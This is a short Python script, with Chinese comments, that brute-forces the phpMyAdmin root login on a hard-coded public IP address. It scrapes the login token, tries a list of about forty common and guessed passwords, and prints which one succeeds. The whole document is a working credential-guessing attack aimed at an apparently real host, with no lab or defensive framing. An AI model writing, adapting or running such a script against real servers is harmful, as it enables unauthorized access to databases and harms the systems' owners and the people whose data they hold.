#!/usr/bin/env python3
"""phpMyAdmin密码爆破"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]
B = "http://124.71.142.158:8980/phpmyadmin"

def try_login(user, pw):
    cj.clear()
    r = op.open(f"{B}/", timeout=8)
    html = r.read().decode("utf-8","ignore")
    m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
    if not m: return "NOTOKEN"
    data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
    try:
        op.open(urllib.request.Request(f"{B}/index.php", data=data), timeout=8).read()
        # 带cookie访问
        r = op.open(f"{B}/index.php", timeout=8)
        body = r.read().decode("utf-8","ignore")
        if "Cannot log in" in body or "#1045" in body:
            return "FAIL"
        if "logout" in body or "navigation" in body or "server_databases" in body:
            return "SUCCESS"
        return "UNKNOWN"
    except Exception:
        return "ERR"

pwds = ["123456","admin","12345678","mysql","root123","password","123456789","admin123",
        "test","phpstudy","phpStudy","root","12345","1234567","888888","111111",
        "000000","admin888","mysql123","passw0rd","abc123","123123","654321",
        "1234567890","qwerty","p@ssw0rd","P@ssw0rd","123456789a","admin@123",
        "www123","web123","server","databases","phpmyadmin","pma","xm123456",
        "dianzi","chuangye","caiwu","kuaiji","zhuce","gongsi"]

for pw in pwds:
    r = try_login("root", pw)
    if r == "SUCCESS":
        print(f"!!! phpMyAdmin root/{pw} 登录成功!", flush=True)
        sys.exit(0)
    elif r == "UNKNOWN":
        print(f"[?] root/{pw}: 异常响应", flush=True)
    time.sleep(0.3)
print("DONE")
